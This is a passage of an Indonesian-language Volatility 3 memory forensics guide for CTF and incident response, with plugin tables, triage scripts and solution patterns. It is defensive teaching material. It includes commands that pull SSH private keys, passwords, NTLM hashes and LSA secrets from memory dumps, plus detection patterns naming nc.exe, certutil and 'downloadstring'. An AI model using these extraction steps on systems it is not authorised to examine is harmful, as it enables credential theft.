_Contoh Output saat Terinfeksi Rootkit:_

```text
Module Name         Module Address          Status
rootkit             0xffffffffa0012000      UNLINKED / HIDDEN MODULE DETECTED!
```

Jika output menampilkan `UNLINKED`, modul kernel tersebut telah memutus dirinya dari struktur modul resmi untuk menyembunyikan aktivitas jahat.

#### D. Hunting SSH Keys & Password Sudo di RAM

Memori proses Linux menyimpan private key dan buffer autentikasi PAM:

Bash

```
# 1. Cari open SSH connections / keys di memory dump
strings -a mem.raw | grep -A 30 "-----BEGIN OPENSSH PRIVATE KEY-----"

# 2. Cari pattern flag atau token autentikasi di heap
strings -a mem.raw | grep -iE "sudo.*password|AUTHENTICATION_SUCCESS"
```

---

## 🔬 Bagian 4: Advanced Analysis Techniques

### 4.1 Hunting Fileless Malware

Malware modern tidak menyimpan file executable biner di disk, melainkan langsung menyuntikkan payload ke dalam memory space proses legal seperti `svchost.exe`, `explorer.exe`, atau `spoolsv.exe`.

#### Metodologi Analisis:

1. **VAD Allocation Check:** Periksa Virtual Address Descriptor (VAD) via `windows.vadinfo`. Cari region dengan permission `PAGE_EXECUTE_READWRITE` yang **tidak berasosiasi dengan file backing di disk**.
2. **Unmapped Executable:** Ekstrak memori region tersebut menggunakan `windows.malfind --dump`. Jika awal byte memuat header `MZ` (`0x4D 0x5A`) atau shellcode stub (`0x55 0x8B 0xEC`), proses tersebut telah mengalami **Process Hollowing**.
3. **Process Path Mismatch:** Validasi executable path asli melalui `windows.dlllist`. Jika `svchost.exe` memiliki `ImageFileName` yang mengarah ke luar `C:\Windows\System32\`, executable tersebut palsu.

---

### 4.2 Raw Memory Scraping & String Carving

Jika Volatility gagal mem-parse OS structure (misal karena symbol korup atau arsitektur custom), gunakan teknik carving berbasis regular expression langsung pada image raw:

Bash

```
# 1. Ekstraksi string ASCII (8-bit)
strings -a -td mem.raw | grep -iE "picoCTF\{|HTB\{|flag\{"

# 2. Ekstraksi string Unicode (16-bit Little-Endian - Standar Windows Memory)
strings -a -e l -td mem.raw | grep -iE "picoCTF\{|HTB\{|flag\{"

# 3. Ekstraksi password dari dump menggunakan pattern regex spesifik
strings -a -e l mem.raw | grep -iE "password\s*=\s*[^\s]+" | head -n 20
```

---

### 4.3 Python Automation Script untuk Memory Batch Analysis

Script Python mandiri berikut memanggil API internal Volatility 3 untuk memindai proses, mengidentifikasi anomali, dan mengekstrak command line secara otomatis:

Python

```
#!/usr/bin/env python3
"""
Custom Volatility 3 Batch Inspector
Memeriksa file memory dump untuk mendeteksi reverse shell dan eksekusi mencurigakan.
"""
import sys
import subprocess
import json

def run_vol(dump_path, plugin):
    cmd = ["vol", "-f", dump_path, "-r", "json", plugin]
    try:
        proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
        return json.loads(proc.stdout)
    except Exception as e:
        print(f"[-] Gagal menjalankan plugin {plugin}: {e}")
        return []

def main(mem_dump):
    print(f"[*] Menjalankan triage otomatis pada: {mem_dump}")
    
    # 1. Cek PsList
    print("[+] 1. Memeriksa daftar proses...")
    ps_data = run_vol(mem_dump, "windows.pslist.PsList")
    suspicious_pids = []
    
    for row in ps_data:
        image = row.get("ImageFileName", "")
        pid = row.get("PID", 0)
        ppid = row.get("PPID", 0)
        
        # Deteksi string anomali proses
        if image.lower() in ["powershell.exe", "cmd.exe", "nc.exe", "certutil.exe"]:
            print(f"    [!] Deteksi Proses Mencurigakan: {image} (PID: {pid}, PPID: {ppid})")
            suspicious_pids.append(pid)

    # 2. Cek NetScan
    print("\n[+] 2. Memeriksa koneksi jaringan...")
    net_data = run_vol(mem_dump, "windows.netscan.NetScan")
    for conn in net_data:
        state = conn.get("State", "")
        foreign_addr = conn.get("ForeignAddr", "")
        foreign_port = conn.get("ForeignPort", 0)
        owner_pid = conn.get("PID", 0)
        
        if state == "ESTABLISHED":
            print(f"    [!] Koneksi Aktif: PID {owner_pid} terhubung ke {foreign_addr}:{foreign_port}")

    print("\n[*] Triage ringkas selesai.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <memory_dump.raw>")
        sys.exit(1)
    main(sys.argv[1])
```

---

### 4.4 Timeline Analysis dari Memori

Rekonstruksi kronologis kejadian dapat disusun dengan mengkorelasikan tiga sumbu waktu di Volatility:

text

```
[2023-10-18 14:18:30] WINWORD.EXE start (CreateTime)
        │
[2023-10-18 14:19:01] WINWORD.EXE membuat koneksi ke 185.199.108.153 (NetScan)
        │
[2023-10-18 14:20:45] powershell.exe di-spawn oleh WINWORD.EXE (PSTree)
        │
[2023-10-18 14:20:50] powershell.exe membuka socket ke 10.0.0.99:4444 (NetScan)
        │
[2023-10-18 14:21:02] cmd.exe di-spawn di bawah powershell.exe (PSTree)
```

Gunakan plugin `windows.timeliner.Timeliner` untuk mengekstrak seluruh event waktu ke format terpadu:

Bash

```bash
# ⚠️ PERINGATAN: Plugin timeliner SANGAT LAMBAT (bisa 30-60+ menit pada memory dump besar).
# Perintah resmi Volatility 3:
vol -f mem.raw windows.timeliner.Timeliner --output-file memory_timeline.csv

# Atau jalankan di background:
vol -f mem.raw windows.timeliner.Timeliner --output-file memory_timeline.csv &
echo "[*] Timeliner berjalan di background, PID: $!"

# ALTERNATIF CEPAT UNTUK CTF: Gabungkan output plugin utama ke file timeline manual
{
  echo "=== 1. PSLIST TIMELINE ==="
  vol -f mem.raw windows.pslist
  echo "=== 2. NETSCAN TIMELINE ==="
  vol -f mem.raw windows.netscan
  echo "=== 3. CMDLINE TIMELINE ==="
  vol -f mem.raw windows.cmdline
} > quick_timeline.txt
```

---

## 🎯 Bagian 5: Plugin Reference Lengkap

### 5.1 Tabel Master Windows Plugins (Volatility 3)

|No|Kategori|Nama Plugin|Fungsi Operasional|Contoh Command|
|---|---|---|---|---|
|1|OS Info|`windows.info`|Mendeteksi versi kernel, arsitektur, dan waktu sistem|`vol -f mem.raw windows.info`|
|2|Process|`windows.pslist`|Menampilkan proses aktif melalui `ActiveProcessLinks`|`vol -f mem.raw windows.pslist`|
|3|Process|`windows.pstree`|Menampilkan visual hierarki pohon Parent-Child proses|`vol -f mem.raw windows.pstree`|
|4|Process|`windows.psscan`|Carving pool scanning untuk menemukan hidden/unlinked proses|`vol -f mem.raw windows.psscan`|
|5|Process|`windows.cmdline`|Mengekstrak argumen CLI saat proses dijalankan|`vol -f mem.raw windows.cmdline`|
|6|Process|`windows.dlllist`|Menampilkan daftar seluruh dynamic-link library per proses|`vol -f mem.raw windows.dlllist --pid <PID>`|
|7|Process|`windows.handles`|Menampilkan open handles (file, key, mutant, section)|`vol -f mem.raw windows.handles --pid <PID>`|
|8|Network|`windows.netscan`|Memindai koneksi TCP/UDP, listening port, dan binding PID|`vol -f mem.raw windows.netscan`|
|9|Network|`windows.netstat`|Alternatif traversal table socket jaringan|`vol -f mem.raw windows.netstat`|
|10|File|`windows.filescan`|Memindai objek `FILE_OBJECT` yang termuat di RAM|`vol -f mem.raw windows.filescan`|
|11|File|`windows.dumpfiles`|Mengekstrak file biner dari memory cache via virtual address|`vol -f mem.raw windows.dumpfiles --virtaddr <ADDR>`|
|12|Registry|`windows.registry.hivelist`|Menampilkan daftar hive registry termuat beserta virtual address|`vol -f mem.raw windows.registry.hivelist`|
|13|Registry|`windows.registry.hivescan`|Memindai pool header hive registry di memori|`vol -f mem.raw windows.registry.hivescan`|
|14|Registry|`windows.registry.printkey`|Membaca subkey dan nilai registry tertentu|`vol -f mem.raw windows.registry.printkey --key <PATH>`|
|15|Registry|`windows.registry.userassist`|Mengekstrak riwayat eksekusi aplikasi GUI user (ROT13)|`vol -f mem.raw windows.registry.userassist`|
|16|Credential|`windows.hashdump`|Mengekstrak NTLM hash akun lokal dari SAM & SYSTEM|`vol -f mem.raw windows.hashdump`|
|17|Credential|`windows.lsadump`|Mengambil rahasia LSA (LSA Secrets) dan service account|`vol -f mem.raw windows.lsadump`|
|18|Credential|`windows.cachedump`|Mengekstrak cached domain credentials (DCC2 hashes)*|`vol -f mem.raw windows.cachedump`|
|19|Malware|`windows.malfind`|Memindai region VAD RWX untuk deteksi injeksi kode|`vol -f mem.raw windows.malfind --dump`|

> ⚠️ **Catatan Aksesibilitas Modern:** Plugin `windows.cachedump` pada Volatility 3 bekerja paling handal pada Windows 7 / Server 2008 R2. Untuk Windows 10/11 modern karena pergeseran struktur NL$Cache, gunakan `windows.lsadump` sebagai alternatif utama.
|20|Malware|`windows.vadinfo`|Menampilkan struktur rinci Virtual Address Descriptor|`vol -f mem.raw windows.vadinfo --pid <PID>`|
|21|Memory|`windows.memmap`|Dump memory map utuh dari sebuah proses|`vol -f mem.raw windows.memmap --dump --pid <PID>`|
|22|Service|`windows.svcscan`|Memindai database Windows Services di memori|`vol -f mem.raw windows.svcscan`|
|23|Misc|`windows.clipboard`|Mengekstrak isi clipboard aktif saat dump diambil|`vol -f mem.raw windows.clipboard`|
|24|Misc|`windows.envars`|Menampilkan seluruh environment variable per proses|`vol -f mem.raw windows.envars`|
|25|Misc|`windows.sessions`|Menampilkan sesi interaktif yang sedang login|`vol -f mem.raw windows.sessions`|
|26|Disk Artefact|`windows.mftscan`|Memindai record master file table (MFT) di RAM|`vol -f mem.raw windows.mftscan`|
|27|Driver|`windows.driverscan`|Memindai objek driver kernel yang sedang terpasang|`vol -f mem.raw windows.driverscan`|

---

### 5.2 Tabel Master Linux Plugins (Volatility 3)

|No|Nama Plugin|Fungsi Operasional|Contoh Command|
|---|---|---|---|
|1|`linux.pslist`|Listing seluruh task struct proses aktif|`vol -f mem.raw linux.pslist`|
|2|`linux.pstree`|Menampilkan hierarki proses tree Linux|`vol -f mem.raw linux.pstree`|
|3|`linux.psscan`|Carving pool scanning untuk menemukan hidden task Linux|`vol -f mem.raw linux.psscan`|
|4|`linux.bash`|Ekstraksi command history bash langsung dari RAM|`vol -f mem.raw linux.bash`|
|5|`linux.netstat`|Menampilkan soket jaringan dan koneksi aktif|`vol -f mem.raw linux.netstat`|
|6|`linux.sockstat`|Ringkasan statistik soket Linux|`vol -f mem.raw linux.sockstat`|
|7|`linux.lsof`|Menampilkan file terbuka per PID|`vol -f mem.raw linux.lsof --pid <PID>`|
|8|`linux.check_creds`|Memeriksa ketidaksesuaian credential struct UID/GID|`vol -f mem.raw linux.check_creds`|
|9|`linux.check_modules`|Mendeteksi rootkit LKM yang tersembunyi|`vol -f mem.raw linux.check_modules`|
|10|`linux.lsmod`|Menampilkan daftar modul kernel (LKM) aktif|`vol -f mem.raw linux.lsmod`|
|11|`linux.malfind`|Memindai memory VMA dengan proteksi RWX|`vol -f mem.raw linux.malfind`|
|12|`linux.elfs`|Ekstraksi binary ELF dari memory space proses|`vol -f mem.raw linux.elfs --pid <PID>`|
|13|`linux.proc_maps`|Menampilkan virtual memory mapping per proses|`vol -f mem.raw linux.proc_maps --pid <PID>`|
|14|`linux.mountinfo`|Menampilkan daftar partisi file system yang termount|`vol -f mem.raw linux.mountinfo`|
|15|`linux.keyboard_notifiers`|Deteksi hook keylogger pada kernel notifier call chain|`vol -f mem.raw linux.keyboard_notifiers`|
|16|`linux.capabilities`|Menampilkan POSIX capabilities yang dimiliki proses|`vol -f mem.raw linux.capabilities`|

---

## 🚩 Bagian 6: 10 Common CTF Memory Forensics Patterns

### Pattern 1: Flag di Clipboard Memori

- **Indikasi / Trigger:** Deskripsi CTF menyebutkan "User baru saja menyalin sesuatu yang penting sebelum komputer dimatikan".
- **Plugin:** `windows.clipboard`
- **Command:**
    
    Bash
    
    ```
    vol -f mem.raw windows.clipboard
    ```
    
- **Interpretasi Hasil:** Kolom `Text` langsung menampilkan isi teks yang di-copy: `picoCTF{cl1pb04rd_1s_n3v3r_s4f3}`.

---

### Pattern 2: Password / Flag di PowerShell Encoded Command

- **Indikasi / Trigger:** Terdapat proses `powershell.exe` pada `pslist`, deskripsi challenge berfokus pada eksekusi payload tersembunyi.
- **Plugin:** `windows.cmdline`
- **Command:**
    
    Bash
    
    ```
    vol -f mem.raw windows.cmdline | grep -i "enc"
    ```
    
- **Interpretasi Hasil:** Ambil string Base64 UTF-16LE setelah `-enc` atau `-EncodedCommand`, lalu decode:
    
    Bash
    
    ```bash
    # Penjelasan: Parameter PowerShell -EncodedCommand selalu menggunakan encoding UTF-16LE (2-byte per char).
    # `base64 -d` membuang encoding base64, lalu `iconv` mengubah UTF-16LE ke UTF-8 agar terbaca di terminal:
    echo "<BASE64_STRING>" | base64 -d | iconv -f UTF-16LE -t UTF-8 2>/dev/null

    # Jika iconv tidak tersedia, gunakan alternatif strings atau Python:
    echo "<BASE64_STRING>" | base64 -d | strings -e l

    # Atau via Python:
    python3 -c "import base64; print(base64.b64decode('<BASE64_STRING>').decode('utf-16-le', errors='ignore'))"
    ```
    

---

### Pattern 3: Ekstraksi Data Sensitif dari Browser Memory (Chrome / Firefox)

- **Indikasi / Trigger:** Banyak proses `chrome.exe` berjalan, flag berkaitan dengan sesi web atau password login yang belum di-submit.
- **Plugin:** `windows.memmap`
- **Command:**
    
    Bash
    
    ```
    # Dump seluruh memory range salah satu proses Chrome (misal PID 2412)
    vol -f mem.raw -o dump_chrome windows.memmap --dump --pid 2412
    strings -a -e l dump_chrome/pid.2412.dmp | grep -iE "password=|flag\{|token" | head -n 10
    ```
    
- **Interpretasi Hasil:** String form login yang tersimpan di heap browser diekstrak dalam bentuk plaintext.

---

### Pattern 4: Process Hollowing / Injeksi ke `svchost.exe`

- **Indikasi / Trigger:** `svchost.exe` memiliki koneksi jaringan ke port non-standar, atau penggunaan CPU tinggi.
- **Plugin:** `windows.malfind`
- **Command:**
    
    Bash
    
    ```
    vol -f mem.raw windows.malfind --pid 792
    ```
    
- **Interpretasi Hasil:** Terdapat header executable `MZ` di region memori yang memiliki permission `PAGE_EXECUTE_READWRITE`.

    ```bash
    # Langkah 1: Coba analisis cepat dengan strings terlebih dahulu (jauh lebih cepat di CTF)
    strings -a -e l ./malfind_dumps/pid.792.*.dmp | grep -iE "flag\{|HTB\{|picoCTF\{"
    ```

    ```text
    # Langkah 2: Jika strings gagal, baru lakukan analisis mendalam via Ghidra:
    1. Buka Ghidra -> New Project -> Import File (pilih file .dmp hasil dump malfind).
    2. Jika format tidak terdeteksi otomatis, pilih Format: "Raw Binary".
    3. Tentukan Language / Architecture: x86-64 (atau x86 32-bit tergantung OS).
    4. Klik "Analyze" saat ditanyakan untuk Auto Analysis.
    5. Setelah analisis selesai: Buka menu Search -> For Strings -> Cari pattern "flag" atau "HTB".
    ```

---

### Pattern 5: Flag Berada di File yang Sudah Dihapus dari Disk

- **Indikasi / Trigger:** File `flag.txt` tidak ditemukan di image disk, tetapi proses editor teks sempat membukanya sebelum dihapus.
- **Plugin:** `windows.filescan` & `windows.dumpfiles`
- **Command:**
    
    Bash
    
    ```
    # 1. Cari virtual address file
    vol -f mem.raw windows.filescan | grep -i "flag\.txt"
    # Misal ditemukan di 0xfa8002a15080
    
    # 2. Dump file object dari RAM
    vol -f mem.raw -o ./out windows.dumpfiles --virtaddr 0xfa8002a15080
    cat ./out/*.dat
    ```
    
- **Interpretasi Hasil:** Cache file object berhasil direkonstruksi langsung dari memory pool tanpa memerlukan struktur filesystem disk.

---

### Pattern 6: Kredensial di LSA Secrets

- **Indikasi / Trigger:** Sistem terhubung ke Active Directory, service account digunakan untuk tugas terjadwal (_scheduled tasks_).
- **Plugin:** `windows.lsadump`
- **Command:**
    
    Bash
    
    ```
    vol -f mem.raw windows.lsadump
    ```
    
- **Interpretasi Hasil:** Kata sandi layanan backup atau domain machine account dicetak dalam plaintext: `$MACHINE.ACC: Plaintext: SecretP@ssw0rd!`.

---

### Pattern 7: Deteksi Reverse Shell Aktif

- **Indikasi / Trigger:** Challenge bertema "Compromised Machine / Breach Investigation".
- **Plugin:** `windows.netscan`
- **Command:**
    
    Bash
    
    ```
    vol -f mem.raw windows.netscan | grep -i "ESTABLISHED"
    ```
    
- **Interpretasi Hasil:** Amati PID yang terhubung ke IP penyerang (misal port 4444, 1337). Telusuri PID tersebut menggunakan `windows.pstree` dan `windows.cmdline` untuk memetakan payload shellcode.

---

### Pattern 8: Flag di Uncommitted Bash History Linux

- **Indikasi / Trigger:** Memory dump Linux, penyerang menghapus `.bash_history` sebelum disconnect.
- **Plugin:** `linux.bash`
- **Command:**
    
    Bash
    
    ```
    vol -f mem.raw linux.bash
    ```
    
- **Interpretasi Hasil:** Seluruh baris perintah yang sempat diketikkan di sesi shell interaktif langsung terbaca lengkap dengan timestamp.

---

### Pattern 9: Encoded Flag di Environment Variable

- **Indikasi / Trigger:** Petunjuk soal mengarah ke "Variables", "Configurations", atau "Docker Container Environment".
- **Plugin:** `windows.envars` (atau strings pada Linux)
- **Command:**
    
    Bash
    
    ```
    vol -f mem.raw windows.envars | grep -iE "FLAG|CTF|SECRET|PASS"
    ```
    
- **Interpretasi Hasil:** Nilai variabel `FLAG=HTB{3nv_v4rs_4r3_n0t_h1dd3n}` terekspos secara langsung.

---

### Pattern 10: Proses Custom yang Tidak Dikenal

- **Indikasi / Trigger:** Terdapat nama executable aneh di `pslist` (misal: `chall.exe`, `beacon.exe`, `agent.bin`).
- **Plugin:** `windows.memmap` / `linux.elfs`
- **Command:**
    
    Bash
    
    ```
    # Ekstraksi seluruh binary proses custom
    vol -f mem.raw -o ./extracted_bin windows.dumpfiles --pid <PID>
    # Lakukan reverse engineering biner hasil dump
    strings ./extracted_bin/*.exe | grep -i "flag"
    ```
    
- **Interpretasi Hasil:** Biner hasil dump dapat langsung dianalisis menggunakan decompiler (Ghidra/IDA Pro) untuk reverse engineering alur kalkulasi flag.

---

## 🗺️ Bagian 7: Decision Tree Memory Forensics

Gunakan peta alur keputusan ini untuk memandu investigasi memory dump:

text

```
                            [ MEMORY DUMP DITERIMA ]
                                       │
                      ┌────────────────┴────────────────┐
                      ▼                                 ▼
             [ windows.info ]                  [ linux.banner ]
           (Sukses Windows PDB)              (Sukses Linux Banner)
                      │                                 │
         ┌────────────┴────────────┐                    ├► Setup Symbol JSON via dwarf2json
         ▼                         ▼                    │  (Pindahkan ke symbols/linux/)
    [ WINDOWS ]                 [ LINUX ]               │
         │                         │                    ▼
         ├► 1. pslist & pstree     └────────────────► [ EKSEKUSI LINUX TRIAGE ]
         │     (Audit Parent-Child)                     │
         ├► 2. cmdline                                  ├► linux.pslist & linux.pstree
         │     (Decode Base64 / IEX)                    ├► linux.bash (Carve history RAM)
         ├► 3. netscan                                  ├► linux.netstat (Cek reverse shell)
         │     (Identifikasi IP C2 & Port)              ├► linux.lsof (File terbuka)
         ├► 4. filescan | grep flag                     ├► linux.malfind (Deteksi VMA RWX)
         │     └── dumpfiles --virtaddr                 └► linux.check_creds (Rootkit check)
         ├► 5. hashdump & lsadump
         │     └── Cracking via Hashcat (-m 1000)
         ├► 6. malfind
         │     └── Dump memory injected code
         └► 7. clipboard & envars
```

---

## 🤖 Bagian 8: Automation Script (vol_triage.sh)

Simpan script berikut sebagai `/usr/local/bin/vol_triage.sh` dan berikan izin eksekusi (`chmod +x`):

Bash

```
#!/bin/bash
# ==============================================================================
# Automated Volatility 3 Memory Triage Script for CTF & Incident Response
# Target OS: Parrot OS / Debian-based
# ==============================================================================

# Catatan: set -e sengaja tidak diaktifkan global agar script tidak berhenti jika satu plugin tidak didukung.

if [ -z "$1" ]; then
    echo "Usage: $0 <memory_dump.raw> [--quick | --full | --creds-only]"
    exit 1
fi

DUMP="$1"
MODE="${2:---quick}"

# Validasi mode input
case "$MODE" in
    --quick|--full|--creds-only) ;;
    *)
        echo "[-] Mode tidak dikenal: $MODE"
        echo "    Gunakan: --quick | --full | --creds-only"
        exit 1
        ;;
esac

if [ ! -f "$DUMP" ]; then
    echo "[-] File dump $DUMP tidak ditemukan!"
    exit 1
fi

OUT_DIR="vol_triage_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUT_DIR"

echo "=============================================================================="
echo "                 VOLATILITY 3 AUTOMATED MEMORY TRIAGE                         "
echo "=============================================================================="
echo "[*] Target Dump : $DUMP"
echo "[*] Triage Mode : $MODE"
echo "[*] Output Dir  : $OUT_DIR"
echo "=============================================================================="

# 1. IDENTIFIKASI OS & BANNER
echo "[+] 1. Mengidentifikasi Arsitektur & Kernel Sistem Operasi..."
if vol -f "$DUMP" windows.info > "$OUT_DIR/windows_info.txt" 2>&1; then
    OS_TYPE="windows"
    echo "    [+] Terdeteksi OS: WINDOWS"
    cat "$OUT_DIR/windows_info.txt" | grep -E "Is64Bit|NtBuildNumber|SystemTime"
else
    echo "    [*] Memeriksa kemungkinan OS Linux..."
    if strings "$DUMP" | grep -E "Linux version [0-9]+\.[0-9]+" | head -n 1 > "$OUT_DIR/linux_banner.txt"; then
        OS_TYPE="linux"
        echo "    [+] Terdeteksi OS: LINUX"
        cat "$OUT_DIR/linux_banner.txt"
    else
        echo "[-] Gagal menentukan OS secara otomatis. Memerlukan analisis manual."
        exit 1
    fi
fi
echo ""

# EKSEKUSI TRIAGE WINDOWS
if [ "$OS_TYPE" == "windows" ]; then

    if [ "$MODE" == "--creds-only" ] || [ "$MODE" == "--full" ]; then
        echo "[+] [CREDENTIALS] Mengekstrak SAM Hash & LSA Secrets..."
        vol -f "$DUMP" windows.hashdump > "$OUT_DIR/hashdump.txt" 2>&1 || true
        vol -f "$DUMP" windows.lsadump > "$OUT_DIR/lsadump.txt" 2>&1 || true
        echo "    [+] Hashdump disimpan ke $OUT_DIR/hashdump.txt"
        cat "$OUT_DIR/hashdump.txt" | head -n 10
        if [ "$MODE" == "--creds-only" ]; then
            echo "[*] Mode creds-only selesai."
            exit 0
        fi
    fi

    echo "[+] 2. Mengekstrak Daftar Proses & Pohon Proses..."
    vol -f "$DUMP" windows.pslist > "$OUT_DIR/pslist.txt" 2>&1
    vol -f "$DUMP" windows.pstree > "$OUT_DIR/pstree.txt" 2>&1
    echo "    [+] Selesai. Total proses: $(grep -c "0x" "$OUT_DIR/pslist.txt" || true)"

    echo "[+] 3. Mengekstrak Command Line Arguments..."
    vol -f "$DUMP" windows.cmdline > "$OUT_DIR/cmdline.txt" 2>&1
    # Cari encoded commands
    SUSP_CMD=$(grep -iE "\-enc|\-w hidden|downloadstring|bypass" "$OUT_DIR/cmdline.txt" || true)
    if [ -n "$SUSP_CMD" ]; then
        echo "    [!] PERINGATAN: Ditemukan Command Line Mencurigakan:"
        echo "$SUSP_CMD"
    fi

    echo "[+] 4. Memindai Koneksi Jaringan Aktif..."
    vol -f "$DUMP" windows.netscan > "$OUT_DIR/netscan.txt" 2>&1
    EST_CONN=$(grep "ESTABLISHED" "$OUT_DIR/netscan.txt" || true)
    if [ -n "$EST_CONN" ]; then
        echo "    [!] Ditemukan Koneksi Aktif (ESTABLISHED):"
        echo "$EST_CONN"
    fi

    echo "[+] 5. Memindai Clipboard & Environment Variables..."
    vol -f "$DUMP" windows.clipboard > "$OUT_DIR/clipboard.txt" 2>&1 || true
    vol -f "$DUMP" windows.envars > "$OUT_DIR/envars.txt" 2>&1 || true

    if [ "$MODE" == "--full" ]; then
        echo "[+] 6. [FULL MODE] Memindai Injeksi Kode (Malfind)..."
        mkdir -p "$OUT_DIR/malfind"
        vol -f "$DUMP" -o "$OUT_DIR/malfind" windows.malfind --dump > "$OUT_DIR/malfind.txt" 2>&1 || true
        
        echo "[+] 7. [FULL MODE] Memindai File Objek Penting..."
        vol -f "$DUMP" windows.filescan > "$OUT_DIR/filescan.txt" 2>&1 || true
        grep -iE "\.flag|\.kdbx|\.txt|secret|desktop|downloads" "$OUT_DIR/filescan.txt" > "$OUT_DIR/files_of_interest.txt" || true
    fi

# EKSEKUSI TRIAGE LINUX
elif [ "$OS_TYPE" == "linux" ]; then
    echo "[+] 2. Mengekstrak Bash History dari RAM..."
    vol -f "$DUMP" linux.bash > "$OUT_DIR/linux_bash.txt" 2>&1 || true
    if [ -s "$OUT_DIR/linux_bash.txt" ]; then
        echo "    [!] Berhasil mengambil Bash History:"
        cat "$OUT_DIR/linux_bash.txt" | head -n 15
    fi

    echo "[+] 3. Mengekstrak Daftar Proses Linux..."
    vol -f "$DUMP" linux.pslist > "$OUT_DIR/linux_pslist.txt" 2>&1 || true
    vol -f "$DUMP" linux.netstat > "$OUT_DIR/linux_netstat.txt" 2>&1 || true
fi

echo ""
echo "=============================================================================="
echo "[+] TRIAGE SELESAI. Seluruh hasil tersimpan di direktori: $OUT_DIR"
echo "=============================================================================="
```

---

## 🛠️ Bagian 9: Troubleshooting & Error Handling

|Pesan Error Volatility 3|Akar Penyebab|Solusi Tindakan|
|---|---|---|
|`No suitable address space mapping found`|Format file dump tidak dikenali atau file corrupt/truncated saat proses transfer.|Verifikasi integritas: periksa magic byte header via `xxd mem.raw \| head -n 2`. Jika berformat `.vmem` atau `.sav`, ekstrak atau konversi ulang.|
|`Unsatisfied requirement: plugins.windows.info.WindowsInfo`|Volatility 3 tidak dapat menemukan Symbol Table yang cocok untuk kernel target.|Hubungkan sistem ke internet agar Volatility dapat mendownload PDB symbol otomatis, atau pasang paket offline symbol table di direktori `symbols/windows/`.|
|`Cannot load symbol table: ...`|File JSON symbols di direktori symbols korup atau memiliki syntax JSON error.|Hapus file JSON terkait dan generate/download ulang symbol table resmi.|
|`Symbol table tidak cocok pada Linux`|Kernel banner pada dump tidak identik dengan versi `vmlinux` yang digunakan saat membuat JSON symbol.|Buat symbol secara presisi menggunakan `dwarf2json` langsung dari versi kernel yang sama dengan file dump target.|
|`ImportError: cannot import name ...`|Dependensi modul Python tidak lengkap atau benturan versi package `pefile`/`capstone`.|Jalankan: `pip3 install --upgrade volatility3 pefile capstone yara-python`.|
|`Memory dump dari VM (.sav) gagal dibaca`|File `.sav` VirtualBox adalah saved state, bukan flat memory dump.|Ekstrak raw memory menggunakan command: `VBoxManage debugvm "VM_NAME" dumpvmcore --filename vm.raw`.|
|Output `windows.pslist` kosong padahal ada proses|Terjadi teknik rootkit DKOM yang memutus _ActiveProcessLinks_.|Gunakan plugin `windows.psscan` untuk mencari struktur proses langsung dari physical memory pages.|
|`Plugin not available in this version`|Syntax plugin menggunakan format Volatility 2 (`pslist`) bukan Volatility 3 (`windows.pslist.PsList`).|Gunakan penamaan plugin Volatility 3 modern lengkap: `windows.<plugin>` atau `linux.<plugin>`.|
|Proses Volatility freeze / Out of Memory di RAM|Dump file terlalu besar (>16GB) untuk diproses oleh alokasi RAM workstation saat parsing VAD tree.|Tambahkan parameter `-r json` untuk streaming output terstruktur atau pecah proses menggunakan virtual swap partition tambahan.|
|`windows.dumpfiles` mengekstrak file kosong (0 bytes)|File object ada di memory table, namun page cluster cache data telah di-swap out atau ditimpa data lain.|Gunakan carving tool berbasis disk scanner langsung pada raw dump: `foremost -i mem.raw -t txt,pdf,png`.|
|`windows.hashdump` error: "Cannot find SAM/SYSTEM hives"|Hive registry belum termuat utuh saat capture atau dump diambil dari versi Windows yang memproteksi SAM di level virtualisasi (VBS).|Gunakan `windows.registry.hivelist` untuk mencari virtual address hive secara manual lalu gunakan parameter `--hive-offset`.|
|`Malformed packet / Page fault` saat parsing DLL|DLL telah di-unload atau memori telah mengalami kompresi (Windows Memory Compression).|Gunakan plugin `windows.vadinfo` untuk mengekstrak raw memory pages di sekitar virtual address DLL tersebut.|

---

### 9.1 🐘 Tips Menangani Memory Dump Berukuran Sangat Besar (>4GB / 8GB / 16GB)

Memory dump berukuran besar dapat menyebabkan Volatility freeze, menghabiskan RAM workstation, atau memenuhi disk SSD. Gunakan teknik penanganan berikut:

```bash
# 1. Cek ukuran file dump terlebih dahulu
ls -lh mem.raw

# 2. Alokasikan Swap File Tambahan jika RAM workstation terbatas (mencegah OOM Kill)
sudo fallocate -l 8G /swapfile2
sudo chmod 600 /swapfile2
sudo mkswap /swapfile2 && sudo swapon /swapfile2

# 3. Turunkan Prioritas Eksekusi CPU agar sistem tetap responsif
nice -n 19 vol -f mem.raw windows.pslist

# 4. Filter langsung output di terminal daripada menyimpan dump teks raksasa ke disk
vol -f mem.raw windows.filescan | grep -i "flag" | tee filescan_flag.txt

# 5. String Carving Paralel & Chunking untuk Memory Dump Raksasa
# Bagi dump menjadi chunk 500MB untuk pemrosesan paralel:
split -b 500M mem.raw chunk_
for chunk in chunk_*; do
  strings -a -e l "$chunk" | grep -iE "flag\{|CTF\{|picoCTF\{" &
done
```

## 📋 Bagian 10: Cheatsheet Copy-Paste Ready

### 1. Initial Triage (Windows & Linux)

Bash

```
# Identifikasi OS dan arsitektur kernel Windows
vol -f mem.raw windows.info

# Identifikasi banner kernel Linux langsung dari raw strings
strings -a mem.raw | grep -E "Linux version [0-9]+\.[0-9]+" | head -n 1

# Eksekusi triage cepat (Proses, Jaringan, Command line)
vol -f mem.raw windows.pslist
vol -f mem.raw windows.cmdline
vol -f mem.raw windows.netscan
```

### 2. Process Analysis

Bash

```
# Listing pohon hierarki Parent-Child proses
vol -f mem.raw windows.pstree

# Carving proses tersembunyi (Rootkit Detection)
vol -f mem.raw windows.psscan

# Audit DLL yang dimuat oleh proses spesifik
vol -f mem.raw windows.dlllist --pid <PID>

# Audit Open Handles (File, Key, Mutex) per proses
vol -f mem.raw windows.handles --pid <PID>
```

### 3. Network Analysis

Bash

```
# Memindai seluruh soket koneksi jaringan aktif dan listening
vol -f mem.raw windows.netscan

# Filter koneksi yang sedang berkomunikasi aktif (ESTABLISHED)
vol -f mem.raw windows.netscan | grep "ESTABLISHED"

# Analisis koneksi jaringan Linux
vol -f mem.raw linux.netstat
```

### 4. File Recovery & Carving

Bash

```
# Memindai pointer file penting di cache memori
vol -f mem.raw windows.filescan | grep -iE "flag|secret|pass"

# Ekstraksi file dari virtual address hasil filescan
vol -f mem.raw -o ./recovered windows.dumpfiles --virtaddr <VIRT_ADDR>

